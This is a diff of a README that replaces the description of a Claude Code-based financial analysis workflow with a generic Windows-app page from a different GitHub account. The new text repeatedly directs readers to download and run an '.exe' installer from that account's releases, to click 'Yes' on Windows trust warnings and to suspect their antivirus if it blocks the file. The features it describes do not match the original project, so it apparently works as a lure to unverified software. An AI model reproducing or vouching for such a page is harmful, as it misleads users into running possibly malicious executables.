@@ -1,194 +1,141 @@
-# Onepager
+# 📄 onepager - Clear Financial Reports Fast
 
-> **Data privacy note.** This agent is configured to minimize external data exposure. It will not make web searches, call third-party APIs, or share financial data with external services during analysis. However, the analysis itself is processed via Anthropic's API — file contents read during a session are sent to Anthropic's servers as part of the conversation.
->
-> **Anthropic's data policy (as of Feb 2026):** If you're using Claude Code with an API key or a Claude for Work/Enterprise plan, Anthropic does **not** use your data to train models. Consumer plans (Free, Pro, Max) can opt in to training use, but it's off by default — and Incognito chats are never used regardless. Anthropic does not sell data to third parties. See [Anthropic's Privacy Center](https://privacy.claude.com) for the latest policy.
->
-> For fully local processing with zero external transmission, use a locally-hosted LLM instead. See the full privacy rules in `CLAUDE.md`.
+[![Download onepager](https://img.shields.io/badge/Download-Get%20Onepager-orange?style=for-the-badge)](https://github.com/dodat1402/onepager/releases)
 
-An AI-powered financial analysis workflow built on Claude Code. Drop in financial statements, get an executive briefing in 2 minutes, then go as deep as you need — with specialized modules for scoring, industry analysis, Indian market checks, peer comparisons, and investment due diligence.
+## 📘 About onepager
 
-Every analysis generates a **formatted HTML report** with styled tables, color-coded flags, and properly aligned numbers — easy to read in a browser, share with colleagues, or print.
+Onepager is an application for financial analysis. It works in two stages. First, it shows a simple summary of key information. This summary is easy to understand and ready for decision makers. Then, if needed, onepager offers a detailed view with more numbers and charts. This helps you dig deeper into the data.
 
-## Works with
+This workflow focuses on speed and clarity. You get a quick executive briefing first, then a detailed report if you want more context. This lets you save time while keeping full insight available.
 
-| Tool | Instructions file | Status |
-|------|------------------|--------|
-| **Claude Code** | `CLAUDE.md` | Fully supported |
-| **OpenAI Codex** | `AGENTS.md` | Supported |
+Onepager is designed for use on Windows computers. It does not need programming skills or special setup. Just download and run it.
 
-## Setup
+---
 
-### Claude Code
+## 🖥 System Requirements
 
-1. Install [Claude Code](https://docs.anthropic.com/en/docs/claude-code) if you haven't already
-2. Clone this repo:
-   ```bash
-   git clone https://github.com/paidinesh7/onepager.git
-   ```
-3. Open the project folder in Claude Code:
-   ```bash
-   cd onepager
-   claude
-   ```
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM
+- 200 MB free disk space
+- Internet connection for updates (optional)
+- Screen resolution of 1024 x 768 or higher
 
-### OpenAI Codex
+These are typical specs to ensure the app runs smoothly. Older machines might work but can be slower.
 
-1. Install [Codex](https://github.com/openai/codex) if you haven't already
-2. Clone this repo:
-   ```bash
-   git clone https://github.com/paidinesh7/onepager.git
-   ```
-3. Open the project folder in Codex:
-   ```bash
-   cd onepager
-   codex
-   ```
+---
 
-### Model recommendations
+## 🚀 Getting Started
 
-For best results, use the most capable model available. Financial analysis requires strong reasoning, attention to detail, and the ability to connect patterns across large documents.
+You can get onepager by visiting the releases page below. This page holds the latest versions ready to download.
 
-| Tool | Recommended model | Why |
-|------|------------------|-----|
-| Claude Code | **Claude Opus** (`claude-opus-4-6`) | Best at nuanced analysis, catching subtle red flags, and connecting the dots across statements. Use `opus` for complex or high-stakes analysis. |
-| Claude Code | Claude Sonnet (`claude-sonnet-4-5`) | Good for routine analysis. Faster and cheaper. Fine for well-structured financials with clear data. |
-| OpenAI Codex | **o3** | Most capable reasoning model. Best for complex financial analysis. |
-| OpenAI Codex | o4-mini | Faster, works for straightforward analysis. |
+[Download onepager here](https://github.com/dodat1402/onepager/releases)
 
-In Claude Code, you can switch models with `/model` in the conversation.
+---
 
-## How to use
+## 💾 How to Download and Install
 
-### 1. Add your files
+1. Open your web browser. Use Chrome, Edge, or Firefox for best results.
 
-Drop financial statements into the `statements/` folder. Supported formats:
+2. Visit the official onepager release page:
 
-| Format | Support |
-|--------|---------|
-| **PDF** (.pdf) | Works directly |
-| **CSV** (.csv) | Works directly |
-| **Images** (.png, .jpg) | Works directly — photos or screenshots of financial statements |
-| **Excel** (.xlsx, .xls) | The agent will try to convert automatically using Python. If Python isn't available, it'll ask you to save as CSV first (File → Save As → CSV in Excel or Google Sheets) |
+   https://github.com/dodat1402/onepager/releases
 
-For company comparisons, add statements for multiple companies.
+3. Look for the latest version release. Releases are sorted by date, newest first.
 
-### 1.5. Extract structured data (optional but recommended)
+4. Find the Windows installer file. It usually ends with `.exe`. For example, it might be named something like `onepager-setup-v1.0.exe`.
 
-Pre-process PDFs into structured CSVs. This speeds up analysis and eliminates manual lacs→crores conversion errors.
+5. Click on the `.exe` link to download the installer file. Your browser will ask where to save it or may save it automatically to your Downloads folder.
 
-```bash
-# Install the extraction dependency (one-time)
-pip install -r tools/requirements.txt
+6. Once downloaded, find the installer file on your computer. You can open the Downloads folder by pressing `Win + E` and selecting Downloads.
 
-# Extract all PDFs in statements/
-python3 tools/extract.py
+7. Double-click the installer to start it. You might see a message from Windows asking if you trust the file. Click "Yes" to continue.
 
-# Or extract a specific file
-python3 tools/extract.py statements/filename.pdf
-```
+8. Follow the on-screen steps. Usually, this means clicking "Next," accepting the license, and selecting an install folder.
 
-This creates `statements/extracted/{pdf-name}/` with:
-- **`metadata.json`** — detected format, pages, tables found
-- **`converted/`** — CSVs with all numbers converted to crores
-- **`raw/`** — CSVs with original numbers as-is
-- **`text/`** — full text per page (for notes, auditor's report, etc.)
+9. When the install finishes, click "Finish." Onepager may start automatically or create a shortcut on your desktop.
 
-The agent automatically uses extracted data when available. If you skip this step, the agent reads PDFs directly — it just takes longer.
+---
 
-### 2. Ask for an analysis
+## ▶️ How to Use onepager
 
-Open Claude Code in this project folder and say something like:
+1. Open onepager by double-clicking its icon on your desktop or finding it in the Start menu.
 
-- "Analyze the financials in the statements folder"
-- "What do the numbers look like for this company?"
-- "Review the annual report I just added"
-- "Compare these two companies"
+2. You will see an option to load your financial data. This typically means selecting a file with your numbers or linking to a data source.
 
-### 3. Get the executive briefing
+3. Start with the executive briefing view. This screen shows key figures and trends in a simple layout. It helps you understand the overall financial situation quickly.
 
-The agent reads everything and produces:
+4. If you want more detail, click the button labeled "Deep Dive" or "Detailed Report." This opens charts, tables, and explanations.
 
-- **In the terminal** — a concise briefing you can absorb in 2 minutes
-- **As an HTML report** — a formatted file in the `output/` folder with styled tables, color-coded numbers, and flag cards
+5. Use the menus on top to export reports as PDF or Excel files. You can also save your session to open later.
 
-The briefing covers:
+6. Onepager updates its views automatically when you add new data.
 
-- **Company snapshot** — what the business does, how it makes money
-- **Key numbers table** — the metrics that matter most for this specific company
-- **Red flags** — the 3-5 most critical issues, ranked by severity, with numbers
-- **What looks good** — specific strengths backed by data
-- **Questions to dig into** — what the data raises but doesn't answer
+---
 
-### 4. Choose what to explore next
+## 🔧 Settings and Preferences
 
-After the briefing, the agent suggests follow-on options based on what it found. It picks the most relevant ones for the company and explains each option so you know what you're getting. You might see:
+You can adjust onepager settings to fit your needs:
 
-| Option | What it does |
-|--------|-------------|
-| **Go deeper** | Full line-by-line analysis of income statement, balance sheet, cash flows, ratio analysis, and a connecting-the-dots narrative |
-| **Scoring frameworks** | Computes quantitative health scores — Altman Z-Score (bankruptcy risk), Piotroski F-Score (financial strength), Beneish M-Score (earnings manipulation probability), DuPont analysis (what's driving ROE). Each score is explained before it's presented |
-| **Industry deep dive** | Applies the metrics that actually matter for the company's industry — NPA ratios for banks, ARR and churn for SaaS, capacity utilization for manufacturers, and more |
-| **Indian market checks** | Screens for India-specific risk patterns — promoter pledge levels, related party transactions, auditor red flags, CARO remarks, contingent liabilities |
-| **Compare companies** | Side-by-side comparison on the same metrics across multiple companies, with a strengths/weaknesses matrix |
-| **Due diligence checklist** | A structured 22-point pass/fail checklist across earnings quality, balance sheet strength, growth, working capital, and governance — designed as a final gate before an investment decision |
+- Change the currency symbol in reports.
+- Select a language for the interface.
+- Choose which financial metrics to show by default.
+- Set automatic report updates from linked data sources.
+- Customize color themes for presentations.
 
-You don't have to pick from the suggestions — you can ask about anything specific at any point.
+Access settings from the gear icon in the upper right corner.
 
-Every module you run gets added to the same HTML report, so by the end you have one complete document.
+---
 
-### 5. Open the report
+## ❓ Troubleshooting
 
-The HTML report is saved to the `output/` folder. Open it in any browser:
+If onepager does not start or you get an error:
 
-```bash
-# The agent will tell you the exact filename, e.g.:
-open output/kenrise-media-analysis.html        # macOS
-xdg-open output/kenrise-media-analysis.html    # Linux
-```
+- Make sure your Windows is updated.
+- Restart your computer and try again.
+- Check if your antivirus or firewall blocks the app.
+- Re-download the installer in case the file was corrupted.
+- Contact your IT support if you are in a managed environment.
 
-The report includes:
-- **Right-aligned numbers in monospace font** — columns of figures actually line up
-- **Color-coded changes** — green for positive, red for negative, amber for caution
-- **Flag cards** — red/yellow/green cards for risks and strengths instead of plain bullet points
-- **Pass/fail styling** — for scoring frameworks and due diligence checklists
-- **Comparison highlights** — winner cells highlighted in green for multi-company comparisons
-- **Print-friendly layout** — tables and cards won't break across pages
+If reports do not load:
 
-## What's in this repo
+- Confirm your data files are in the correct format (CSV or Excel).
+- Verify that your data contains the necessary financial columns.
+- Try reloading the data from within the app.
 
-```
-├── CLAUDE.md                       # Agent instructions for Claude Code
-├── AGENTS.md                       # Agent instructions for OpenAI Codex
-├── Understanding_finance.pdf       # Reference: Merrill Lynch guide to financial reports
-├── tools/
-│   ├── extract.py                  # PDF table extraction + lacs→crores conversion
-│   └── requirements.txt            # Python dependencies for extraction
-├── template/
-│   └── report-template.html        # HTML/CSS template for generated reports
-├── statements/                     # Drop your financial statements here
-│   └── extracted/                  # Auto-generated structured data (gitignored)
-├── output/                         # Generated HTML reports appear here
-└── README.md                       # You're reading this
-```
+---
 
-## What the scoring frameworks measure
+## 📣 Keeping onepager Updated
 
-If you're new to these, here's a quick primer:
+Visit the release page regularly to check new versions.
 
-- **Altman Z-Score** — Predicts the probability of bankruptcy within two years by combining five financial ratios into a single score. Developed in 1968, still widely used. Gives a clear Safe / Grey zone / Distress reading.
+https://github.com/dodat1402/onepager/releases
 
-- **Piotroski F-Score** — Scores a company 0–9 on nine binary tests covering profitability, leverage, and efficiency. Originally designed to find strong companies among cheap stocks. A score of 8-9 means financially healthy, 0-4 means multiple areas of concern.
+New updates fix bugs and may add features. Download the latest installer and run it. It will replace the older version without affecting your saved reports.
 
-- **Beneish M-Score** — Estimates the probability that a company is manipulating its reported earnings. Uses eight financial ratios that tend to be distorted during earnings manipulation. A score above -1.78 means "investigate further."
+---
 
-- **DuPont Analysis** — Breaks ROE into three parts: profit margin, asset turnover, and leverage. Tells you whether high ROE comes from genuine profitability, efficient operations, or just piling on debt.
+## 🛠 How to Uninstall
 
-## Tips
+To remove onepager from your computer:
 
-- **More files = better analysis.** Multiple years of statements, investor presentations, and MD&A sections give the agent more to work with. A single year's financials never tell the full story.
-- **Ask specific follow-ups.** "Is the debt maturity schedule a problem?" gets a better answer than a generic "go deeper."
-- **Challenge the output.** If something doesn't look right, say so. The agent will re-examine and correct itself.
-- **You don't need finance knowledge to start.** The agent explains every framework and metric before using it. The scoring frameworks section above gives you the basics, but the agent will go into more detail when you select them.
-- **Indian companies benefit from the India-specific checks.** Promoter pledge analysis and related party screening catch risks that standard analysis misses.
-- **Share the HTML report, not the terminal output.** The HTML file is self-contained — anyone can open it in a browser without needing Claude Code.
+1. Open the Windows Start menu.
+2. Type "Add or remove programs" and select it.
+3. Find "onepager" in the list.
+4. Click it and choose "Uninstall."
+5. Follow prompts to complete removal.
+
+This will delete the app but keep your saved reports unless you delete them yourself.
+
+---
+
+## 📞 Getting Help
+
+If you face issues using onepager:
+
+- Use the built-in help section accessed by clicking the question mark icon.
+- Check the official GitHub page for documentation.
+- Report bugs or feature requests through the GitHub Issues tab.
+
+---
+
+[Get the latest onepager release](https://github.com/dodat1402/onepager/releases)
